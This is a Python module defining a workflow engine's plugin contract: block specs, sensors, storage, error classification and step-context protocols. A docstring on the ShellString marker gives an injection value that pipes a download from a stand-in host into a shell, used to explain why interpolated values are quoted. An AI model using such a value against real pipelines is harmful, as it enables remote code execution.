"""The dirigent block contract: the only module a third-party plugin package needs to import."""

from abc import ABC, abstractmethod
from collections.abc import AsyncGenerator, AsyncIterator, Callable, Mapping
from contextlib import AbstractAsyncContextManager
from datetime import datetime, timedelta
from enum import StrEnum
from pathlib import Path
from typing import Any, ClassVar, Protocol, cast
from uuid import UUID

import httpx2
from jsonschema import FormatChecker
from pydantic import BaseModel, ConfigDict, Field, GetJsonSchemaHandler, JsonValue, field_validator, model_validator
from pydantic.json_schema import JsonSchemaValue
from pydantic_core import CoreSchema

from dirigent_common import API_VERSION, SHELL_MEDIA_TYPE, HealthReport, JsonMap

type RunId = UUID

#: A connection is referenced by name, never by id, so documents stay portable.
type ConnectionRef = str

#: A JSON Schema format checker: a predicate that returns True when a value satisfies the
#: format, False when it does not, and may instead raise to signal the value is invalid --
#: exactly what ``jsonschema.FormatChecker.checks`` registers.
type FormatCheck = Callable[[object], bool]

#: Block ids are public API.
BLOCK_ID_PATTERN = r"^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$"

#: A block group is one bare word, the shape of a block id's first half.
BLOCK_GROUP_PATTERN = r"^[a-z][a-z0-9_]*$"

SURFACE_ID_PATTERN = r"^[a-z][a-z0-9_-]*$"


class ErrorClass(StrEnum):
    """How a block classifies a failure, which is what drives the engine's retry decision."""

    TRANSIENT = "transient"
    """Network, 5xx, timeout: retryable."""

    REJECTED = "rejected"
    """Validation, auth, 4xx: never retried."""

    UNKNOWN = "unknown"
    """Anything else: retried while the step's budget lasts."""


class BlockFailure(Exception):
    """A failure a block reports deliberately, carrying its own error classification."""

    def __init__(self, message: str, *, error_class: ErrorClass = ErrorClass.UNKNOWN) -> None:
        """Record the message and the class the engine should retry (or not retry) on."""
        super().__init__(message)
        self.message = message
        self.error_class = error_class

    def __str__(self) -> str:
        """Render the failure as its message."""
        return self.message


def classify_default(error: Exception) -> ErrorClass:
    """Classify an exception with no block-specific knowledge: transport and 5xx transient, 4xx rejected."""
    match error:
        case BlockFailure():
            return error.error_class
        case httpx2.HTTPStatusError():
            status = error.response.status_code
            if status >= 500:
                return ErrorClass.TRANSIENT
            if 400 <= status < 500:
                return ErrorClass.REJECTED
            return ErrorClass.UNKNOWN
        case httpx2.TransportError() | TimeoutError() | ConnectionError():
            return ErrorClass.TRANSIENT
        case _:
            return ErrorClass.UNKNOWN


class ShellString:
    """Marks a config field whose resolved value is handed to a shell to parse.

    A block that runs ``sh -c`` on a config string has a problem the block cannot solve on
    its own: by the time it sees the string, the engine has already substituted every
    ``${...}`` reference into it, and a literal semicolon written by the pipeline author is
    indistinguishable from one that arrived in a webhook payload. So ``command: "load
    ${params.region}"`` with ``region`` set to ``x; curl evil.sh | sh`` is a shell injection
    reachable by whoever can POST to a webhook.

    Marking the field pushes the knowledge to where the answer is known. The engine quotes
    every interpolated segment before it lands in the string, so a substituted value is
    always exactly one shell word regardless of what is in it, while everything the author
    typed keeps its meaning -- pipes and redirects included, which is the entire reason the
    shell form exists.

    It is a bare class rather than a model: annotation metadata pydantic recognises as a
    model would be read as the field's schema, and this marker must stay invisible to
    validation.

    The one thing it does publish is what the field holds. A string a shell parses is a
    shell program, so the field carries ``contentMediaType: text/x-shellscript`` and a form
    generated from the schema edits it as source rather than as one line of text.
    """

    __slots__ = ()

    def __repr__(self) -> str:
        """Render the marker the way it is written."""
        return "ShellString()"

    def __get_pydantic_json_schema__(
        self,
        schema: CoreSchema,
        handler: GetJsonSchemaHandler,
    ) -> JsonSchemaValue:
        """Publish the marked field as shell source, leaving what it validates untouched."""
        published = handler(schema)
        published["contentMediaType"] = SHELL_MEDIA_TYPE
        return published


def shell_string_fields(model: type[BaseModel]) -> frozenset[str]:
    """List the config fields a model marked as being parsed by a shell."""
    return frozenset(
        name
        for name, field in model.model_fields.items()
        if any(isinstance(marker, ShellString) for marker in field.metadata)
    )


class RemoteHandle(BaseModel):
    """Serializable claim on a job running somewhere other than this block call.

    Remote means "not in this process", which covers a container on the same machine as
    readily as a job in another datacentre: what makes a handle a handle is that the work
    outlives the call that started it and has to be probed.
    """

    model_config = ConfigDict(frozen=True)

    block_id: str = Field(pattern=BLOCK_ID_PATTERN)
    ref: str = Field(min_length=1)
    meta: dict[str, str] = Field(default_factory=dict)


class ProbeStatus(StrEnum):
    """The terminal-or-not state a probe reports for remote work."""

    RUNNING = "running"

    SUCCEEDED = "succeeded"
    """The remote finished; the engine may now fetch the result."""

    FAILED = "failed"

    GONE = "gone"
    """The remote no longer knows the job; the engine applies the lost-job policy."""


class ProbeResult(BaseModel):
    """One side-effect-free observation of submitted remote work."""

    status: ProbeStatus
    message: str | None = None
    progress: float | None = Field(default=None, ge=0.0, le=1.0)
    next_poll_in: timedelta | None = None
    meta: dict[str, str] | None = None
    """What the handle's metadata becomes from here on, or None to leave it as it is.

    A handle is frozen, so this is where a probe writes down how far it has read: the next
    probe, and a following fetch, receive a handle carrying exactly this. It replaces rather
    than merges, so whatever is kept is copied forward.

    Advancing is at-least-once, like fetching: the cursor is stored by the transaction that
    parks the attempt, and a worker that dies before that commit leaves the older cursor to
    be probed from again. So a probe must tolerate reading the same ground twice, and the
    lines it appends to the run may repeat.
    """


class NotYet(BaseModel):
    """A sensor's "the condition does not hold yet" result, which is not a failure."""

    next_poll_in: timedelta | None = None
    message: str | None = None
    """What the sensor is seeing while it waits, surfaced on the waiting attempt."""

    progress: float | None = Field(default=None, ge=0.0, le=1.0)

    cursor: JsonMap | None = None
    """What the next poke receives as ``ctx.cursor``, or None to leave it as it is.

    It replaces rather than merges, so whatever is kept is copied forward. Advancing is
    at-least-once: the cursor is stored by the transaction that parks the attempt, and a
    worker that dies before that commit leaves the older cursor for the next poke to read
    from again. So a poke must tolerate reading the same ground twice.

    The cursor's life is the waiting attempt. A poke that succeeds ends the step, and
    nothing carries the cursor past it.
    """


def _group_from_id(data: Any) -> Any:
    """Fill a spec's group with the id's first half, for a block that declares no group."""
    if not isinstance(data, dict):
        return data
    fields = cast(dict[str, Any], data)
    if fields.get("group"):
        return fields
    block_id = fields.get("id")
    if not isinstance(block_id, str) or "." not in block_id:
        return fields
    return {**fields, "group": block_id.split(".", 1)[0]}


class OperatorSpec(BaseModel):
    """The catalog entry for an operator: its stable id and the properties a caller reads."""

    model_config = ConfigDict(frozen=True)

    id: str = Field(pattern=BLOCK_ID_PATTERN)
    summary: str = Field(min_length=1)
    group: str = Field(default="", pattern=BLOCK_GROUP_PATTERN)
    """The shelf a catalog arranges this block under, defaulting to the id's first half."""

    idempotent: bool = False
    local_execution: bool = False
    default_poll: timedelta | None = None
    """How often to probe this operator's remote work when the step does not say."""

    @model_validator(mode="before")
    @classmethod
    def _shelve(cls, data: Any) -> Any:
        """Default the group to the id's first half."""
        return _group_from_id(data)


class SensorSpec(BaseModel):
    """The catalog entry for a sensor, including the poll cadence the engine defaults to."""

    model_config = ConfigDict(frozen=True)

    id: str = Field(pattern=BLOCK_ID_PATTERN)
    summary: str = Field(min_length=1)
    group: str = Field(default="", pattern=BLOCK_GROUP_PATTERN)
    """The shelf a catalog arranges this block under, defaulting to the id's first half."""

    default_poll: timedelta = timedelta(minutes=1)
    default_deadline: timedelta = timedelta(hours=24)

    @model_validator(mode="before")
    @classmethod
    def _shelve(cls, data: Any) -> Any:
        """Default the group to the id's first half."""
        return _group_from_id(data)


class StatResult(BaseModel):
    """What a storage backend knows about one object without reading it."""

    uri: str = Field(min_length=1)
    size: int = Field(ge=0)
    modified_at: datetime
    content_type: str | None = None


class AlertMessage(BaseModel):
    """What an alert rule hands a notifier: the event, a rendered summary, and links back."""

    event: str = Field(min_length=1)
    subject: str = Field(min_length=1)
    body: str = ""
    run_id: RunId | None = None
    pipeline: str | None = None
    url: str | None = None
    context: dict[str, JsonValue] = Field(default_factory=dict)


class ByteSink(Protocol):
    """The write end of a storage stream."""

    async def write(self, data: bytes) -> int:
        """Append bytes to the stream and return how many were accepted."""
        ...


class Logger(Protocol):
    """The scoped, batched log writer a block is handed; it produces run-visible entries."""

    def debug(self, message: str, **fields: JsonValue) -> None:
        """Record a debug-level entry."""
        ...

    def info(self, message: str, **fields: JsonValue) -> None:
        """Record an info-level entry."""
        ...

    def warning(self, message: str, **fields: JsonValue) -> None:
        """Record a warning-level entry."""
        ...

    def error(self, message: str, **fields: JsonValue) -> None:
        """Record an error-level entry."""
        ...


class Storage(Protocol):
    """The engine's URI-addressed storage facade, dispatching by scheme to a backend."""

    def open_read(self, uri: str) -> AsyncGenerator[bytes]:
        """Stream the object at a URI, closeable so a reader that stops early releases it."""
        ...

    def open_write(self, uri: str) -> AbstractAsyncContextManager[ByteSink]:
        """Open a streamed writer for a URI."""
        ...

    async def stat(self, uri: str) -> StatResult | None:
        """Describe the object at a URI, or return None when it does not exist."""
        ...

    def list(self, uri: str) -> AsyncIterator[StatResult]:
        """List the objects under a URI prefix or matching a glob."""
        ...

    async def delete(self, uri: str) -> None:
        """Remove the object at a URI."""
        ...


class RunState(StrEnum):
    """Where a run is, in the vocabulary a block observing another run reads.

    The block-facing half of the engine's own run status; the two vocabularies must stay in step.
    """

    QUEUED = "queued"
    RUNNING = "running"
    SUCCEEDED = "succeeded"
    COMPLETED_WITH_ERRORS = "completed_with_errors"
    FAILED = "failed"
    CANCELLED = "cancelled"

    @property
    def settled(self) -> bool:
        """Report whether the run has reached a state it will never leave."""
        return self in (RunState.SUCCEEDED, RunState.COMPLETED_WITH_ERRORS, RunState.FAILED, RunState.CANCELLED)


class RunRefused(BlockFailure):
    """The instance refused to start the run a block asked for."""

    def __init__(self, message: str) -> None:
        """Carry the reason, classified as the configuration error it always is."""
        super().__init__(message, error_class=ErrorClass.REJECTED)


class StartedRun(BaseModel):
    """What asking this instance to start a run amounted to."""

    model_config = ConfigDict(frozen=True)

    pipeline: str
    run_id: RunId | None = None
    """The run that was created, or None when the pipeline's concurrency policy dropped it."""

    state: RunState | None = None

    @property
    def skipped(self) -> bool:
        """Report whether the concurrency policy decided the run in flight was enough."""
        return self.run_id is None


class RunSnapshot(BaseModel):
    """One side-effect-free observation of a run this instance holds."""

    model_config = ConfigDict(frozen=True)

    run_id: RunId
    pipeline: str
    state: RunState
    total_steps: int = Field(default=0, ge=0)
    finished_steps: int = Field(default=0, ge=0)
    error: str | None = None

    @property
    def progress(self) -> float | None:
        """Report how far the run has come, or None when it has no steps to count."""
        if self.total_steps <= 0:
            return None
        return min(self.finished_steps / self.total_steps, 1.0)


class Runs(Protocol):
    """Scoped access to this instance's own runs, for a block that composes pipelines."""

    async def start(
        self,
        pipeline: str,
        params: Mapping[str, JsonValue],
        *,
        max_depth: int,
    ) -> StartedRun:
        """Start a run of a named pipeline, attributed to the calling run.

        ``max_depth`` bounds how deep a chain of pipelines starting pipelines may go, counted
        along the attribution chain. Raises :class:`RunRefused` when the pipeline is unknown,
        when the parameters do not satisfy its schema, or when the chain is already that deep.
        """
        ...

    async def snapshot(self, run_id: RunId) -> RunSnapshot | None:
        """Describe a run this instance holds, or return None when it holds no such run."""
        ...

    async def cancel(self, run_id: RunId, *, reason: str) -> bool:
        """Cancel a run; False means it had already settled and there was nothing to stop."""
        ...


class StepContext(Protocol):
    """Handed to every block call by the engine: scoped, audited access to everything a block may touch."""

    run_id: RunId
    attempt: int
    params: Mapping[str, JsonValue]
    log: Logger

    step: str
    """The step's key in the pipeline document, unique within the run."""

    run_item_id: UUID | None
    """The fan-out item this attempt works on, or None outside a fan-out."""

    started_at: datetime
    """When this attempt first started, unchanged by a later poke, probe, or worker restart."""

    inline_capture: int
    """How many bytes of a captured stream this instance lets a block inline in its output."""

    cursor: JsonMap | None
    """The cursor the last committed :class:`NotYet` returned, and None on the first poke.

    Only a sensor's poke reads it; every other call sees None.
    """

    def connection[C: BaseModel](self, ref: ConnectionRef, model: type[C]) -> C:
        """Resolve a named connection, decrypted and validated against the given model."""
        ...

    def storage_connection[C: BaseModel](self, scheme: str, model: type[C]) -> C | None:
        """Resolve the connection this instance configures a storage scheme from, or None.

        The same binding the storage facade itself uses, for a block that must hand a scheme's
        credentials to something other than the facade -- an engine that opens the URI itself.
        None means the scheme is served by whatever its package contributed it with.
        """
        ...

    def http(self, ref: ConnectionRef) -> httpx2.AsyncClient:
        """Build an HTTP client for a named connection with its base URL, auth, TLS, and timeouts applied."""
        ...

    def schema(self, code: str) -> JsonMap:
        """Resolve a named JSON Schema the instance holds by code; an unknown code fails the step."""
        ...

    def format_checker(self) -> FormatChecker:
        """The checker a schema validation asserts formats against: the base plus every contributed one.

        A ``format`` no pack contributes has no checker and stays a passing annotation, so a
        schema is portable across instances -- it asserts where the format lives and passes
        where it does not.
        """
        ...

    @property
    def storage(self) -> Storage:
        """Access URI-addressed storage across every registered scheme."""
        ...

    @property
    def scratch(self) -> str:
        """Return the run-scoped URI prefix for intermediate artifacts."""
        ...

    @property
    def work(self) -> Path:
        """Return the run's directory on this worker's own filesystem, made on first read.

        For what a tool opens through the filesystem rather than through storage: a checkout,
        a build context, a compose file, a bind mount. It is local to the worker that reads
        it, so a path one step leaves here is not one another worker can be handed; anything
        a later step must see goes to :attr:`scratch` through storage.
        """
        ...

    @property
    def runs(self) -> Runs:
        """Start, observe, and cancel runs on this instance, attributed to the calling run."""
        ...


class Operator[ConfigT: BaseModel, OutputT: BaseModel](ABC):
    """One unit of work: finish synchronously, or return a RemoteHandle for the engine to probe."""

    spec: ClassVar[OperatorSpec]
    config_model: ClassVar[type[BaseModel]]
    output_model: ClassVar[type[BaseModel]]

    @abstractmethod
    async def execute(self, config: ConfigT, ctx: StepContext) -> OutputT | RemoteHandle:
        """Do the work once per attempt; never poll inside, return a handle instead."""
        ...

    async def probe(self, handle: RemoteHandle, config: ConfigT, ctx: StepContext) -> ProbeResult:
        """Report the remote job's state; side-effect-free and callable from any worker, any number of times.

        Returning ``meta`` advances the handle every later call receives, which is how a probe
        streaming a remote log into the run records where it has read to. That advance is
        at-least-once: a cursor is only as far along as the last outcome that committed.
        """
        raise NotImplementedError(f"{type(self).__name__} returned a RemoteHandle but does not implement probe()")

    async def fetch(self, handle: RemoteHandle, config: ConfigT, ctx: StepContext) -> OutputT:
        """Retrieve the result after a probe reported SUCCEEDED; safe to call again.

        The only thing that ends an attempt is the transaction recording its outcome, and a
        worker that dies between fetching and that commit leaves the attempt to be claimed,
        probed and fetched again. So this is at-least-once: retrieve, do not consume.
        """
        raise NotImplementedError(f"{type(self).__name__} returned a RemoteHandle but does not implement fetch()")

    async def cancel(self, handle: RemoteHandle, config: ConfigT, ctx: StepContext) -> bool:
        """Best-effort, idempotent cancellation; False means the remote could not be told."""
        return False

    def check_config(self, config: BaseModel) -> list[str]:
        """List the extra refusals this block makes at apply, beyond what its schema says.

        Each string is shown against the step's config location, so a document is refused
        before it is stored rather than the first time it runs.
        """
        return []

    def classify_error(self, error: Exception) -> ErrorClass:
        """Classify a failure raised by this operator, so the engine knows whether to retry."""
        return classify_default(error)


class Sensor[ConfigT: BaseModel, OutputT: BaseModel](ABC):
    """Waits for the world. Each poke is one durable, scheduled probe; it must never block."""

    spec: ClassVar[SensorSpec]
    config_model: ClassVar[type[BaseModel]]
    output_model: ClassVar[type[BaseModel]]

    @abstractmethod
    async def poke(self, config: ConfigT, ctx: StepContext) -> OutputT | NotYet:
        """Observe the world once, read-only and briefly; NotYet is not a failure."""
        ...

    def check_config(self, config: BaseModel) -> list[str]:
        """List the extra refusals this block makes at apply, beyond what its schema says.

        Each string is shown against the step's config location, so a document is refused
        before it is stored rather than the first time it runs.
        """
        return []

    def classify_error(self, error: Exception) -> ErrorClass:
        """Classify a failure raised by this sensor, so the engine knows whether to retry."""
        return classify_default(error)


class StorageBackend(ABC):
    """Registers a URI scheme and streams bytes for it."""

    scheme: ClassVar[str]
    config_model: ClassVar[type[BaseModel]]

    def configured(self, config: BaseModel) -> "StorageBackend":
        """Return this backend bound to one instance's settings for its scheme.

        The contributed backend is shared by every attempt in the process, so an override
        must return a new instance: an attempt must never be able to change the endpoint
        another attempt is already reading through.
        """
        return self

    @abstractmethod
    def open_read(self, uri: str) -> AsyncGenerator[bytes]:
        """Stream the object at a URI.

        An async generator rather than a plain iterator: a reader that stops part way, such
        as a request body abandoned mid-send, closes the stream, and the handle or the
        connection is released there rather than whenever the object is collected.
        """
        ...

    @abstractmethod
    def open_write(self, uri: str) -> AbstractAsyncContextManager[ByteSink]:
        """Open a streamed writer for a URI."""
        ...

    @abstractmethod
    async def stat(self, uri: str) -> StatResult | None:
        """Describe the object at a URI, or return None when it does not exist."""
        ...

    @abstractmethod
    def list(self, uri: str) -> AsyncIterator[StatResult]:
        """List the objects under a URI prefix or matching a glob."""
        ...

    @abstractmethod
    async def delete(self, uri: str) -> None:
        """Remove the object at a URI."""
        ...


class Notifier(ABC):
    """A pluggable message sender that alert rules deliver through."""

    id: ClassVar[str]
    config_model: ClassVar[type[BaseModel]]

    @abstractmethod
    async def send(self, message: AlertMessage, config: BaseModel) -> None:
        """Deliver one alert message through this channel."""
        ...


class ConnectionKind(ABC):
    """A named credential record of a contributed kind whose secret fields the server redacts."""

    id: ClassVar[str]
    config_model: ClassVar[type[BaseModel]]

    @abstractmethod
    async def check(self, config: BaseModel) -> HealthReport:
        """Verify that the configured connection can reach its external system."""
        ...


type AnyOperator = Operator[Any, Any]
type AnySensor = Sensor[Any, Any]


class Contribution(BaseModel):
    """Everything one plugin adds, across all six surfaces, gathered by the host at startup."""

    model_config = ConfigDict(arbitrary_types_allowed=True, frozen=True)

    api_version: int = Field(default=API_VERSION, ge=1)
    operators: list[AnyOperator] = Field(default_factory=list[AnyOperator])
    sensors: list[AnySensor] = Field(default_factory=list[AnySensor])
    storage_backends: list[StorageBackend] = Field(default_factory=list[StorageBackend])
    notifiers: list[Notifier] = Field(default_factory=list[Notifier])
    connection_kinds: list[ConnectionKind] = Field(default_factory=list[ConnectionKind])
    formats: dict[str, FormatCheck] = Field(default_factory=dict[str, FormatCheck])
    """JSON Schema format checkers this plugin adds, by format name. A schema that writes
    ``format: <name>`` then asserts wherever the contributing pack is installed, and stays a
    passing annotation on an instance without it."""

    @field_validator("api_version")
    @classmethod
    def _check_api_version(cls, value: int) -> int:
        """Reject a contribution written against a different revision of this contract."""
        if value != API_VERSION:
            raise ValueError(f"unsupported api_version {value}; this host speaks {API_VERSION}")
        return value

    @model_validator(mode="after")
    def _check_ids(self) -> "Contribution":
        """Reject a contribution whose blocks or surfaces collide on an id."""
        _require_unique("block id", [*(op.spec.id for op in self.operators), *(se.spec.id for se in self.sensors)])
        _require_unique("storage scheme", [backend.scheme for backend in self.storage_backends])
        _require_unique("notifier id", [notifier.id for notifier in self.notifiers])
        _require_unique("connection kind id", [connection.id for connection in self.connection_kinds])
        _require_unique("format", list(self.formats))
        return self

    def block_ids(self) -> list[str]:
        """List every operator and sensor id this contribution registers."""
        return [*(operator.spec.id for operator in self.operators), *(sensor.spec.id for sensor in self.sensors)]


def _require_unique(label: str, values: list[str]) -> None:
    """Raise when a list of contributed ids contains a duplicate."""
    seen: set[str] = set()
    for value in values:
        if value in seen:
            raise ValueError(f"duplicate {label} {value!r} in contribution")
        seen.add(value)


def merge_contributions(contributions: list[Contribution]) -> Contribution:
    """Merge every plugin's contribution into the single catalog the host dispatches from."""
    merged: dict[str, list[Any]] = {
        "operators": [],
        "sensors": [],
        "storage_backends": [],
        "notifiers": [],
        "connection_kinds": [],
    }
    for contribution in contributions:
        for surface, collected in merged.items():
            collected.extend(getattr(contribution, surface))
    formats: dict[str, FormatCheck] = {}
    _require_unique("format", [name for contribution in contributions for name in contribution.formats])
    for contribution in contributions:
        formats.update(contribution.formats)
    return Contribution(api_version=API_VERSION, formats=formats, **merged)
